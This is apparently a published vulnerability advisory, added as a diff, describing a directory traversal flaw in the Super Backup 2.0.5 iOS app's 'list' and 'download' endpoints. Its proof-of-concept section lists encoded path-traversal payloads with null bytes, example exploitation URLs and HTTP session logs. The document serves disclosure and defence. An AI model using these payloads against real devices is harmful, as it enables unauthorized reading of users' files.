@@ -1,0 +1,130 @@
+# Title: Super Backup 2.0.5 for iOS - Directory Traversal
+# Author: Vulnerability Laboratory
+# Date: 2020-04-30
+# Software: https://apps.apple.com/us/app/super-backup-export-import/id1052684097
+# CVE: N/A
+
+Document Title:
+===============
+Super Backup v2.0.5 iOS - Directory Traversal Vulnerability
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2200
+
+Common Vulnerability Scoring System:
+====================================
+7.1
+
+Product & Service Introduction:
+===============================
+Backup all your iPhone or iPad contacts in 1 tap and export them.
+Fastest way to restore contacts from PC or Mac.
+Export by mailing the backed up contacts file to yourself. Export
+contacts file to any other app on your device.
+Export all contacts directly to your PC / Mac over Wifi, no software
+needed! Restore any contacts directly from
+PC / Mac. Restore contacts via mail. Get the ultimate contacts backup
+app now.
+
+(Copy of the Homepage:
+https://apps.apple.com/us/app/super-backup-export-import/id1052684097 )
+
+
+Affected Product(s):
+====================
+Dropouts Technologies LLP
+Product: Super Backup v2.0.5
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-30: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A directory traversal web vulnerability has been discovered in the
+official Super Backup v2.0.5 ios mobile web-application.
+The vulnerability allows remote attackers to change the application path
+in performed requests to compromise the local application
+or file-system of a mobile device. Attackers are for example able to
+request environment variables or a sensitive system path.
+
+The directory-traversal web vulnerability in the app is located in the
+`list` and `download` module with the `path` parameter.
+Attackers are able to change the path variable to request the local list
+command. By changing the path parameter the validation
+mechanism runs into a logic error that turns back the possibility to
+request different pathes outside the basic import/export
+folder. Thus way the attacker injects for example local path environment
+varibales to compromise the local ios web-application.
+
+Exploitation of the directory traversal web vulnerability requires no
+privileged web-application user account or user interaction.
+Successful exploitation of the vulnerability results in information
+leaking by unauthorized file access and mobile application compromise.
+
+
+Proof of Concept (PoC):
+=======================
+The directory traversal vulnerability can be exploited by attackers with
+access to the wifi interface in a local network without user interaction.
+For security demonstration or to reproduce the security vulnerability
+follow the provided information and steps below to continue.
+
+
+PoC: Payloads
+%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%00
+/../../../../../../../../../../../../../../../../../../../../../../%00
+//.././%00
+
+
+PoC: Exploitation
+http://localhost/list?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%00
+http://localhost/download?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%00
+
+
+--- PoC Session Logs [GET]] ---
+http://localhost/list?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%00
+Host: localhost
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+-
+GET: HTTP/1.1 200 OK
+Content-Length: 174
+Content-Type: application/json
+Connection: Close
+-
+http://localhost/download?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%00
+Host: localhost
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+-
+GET: HTTP/1.1 200 OK
+Content-Length: 174
+Content-Type: application/json
+Connection: Close
+-
+Opening the url allows to download the list file json with content path
+output
+[{"path":"../../../../../../../../../../../../ "size":21961}]
+
+
+References:
+http://localhost/list?path=
+http://localhost/download?path=
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
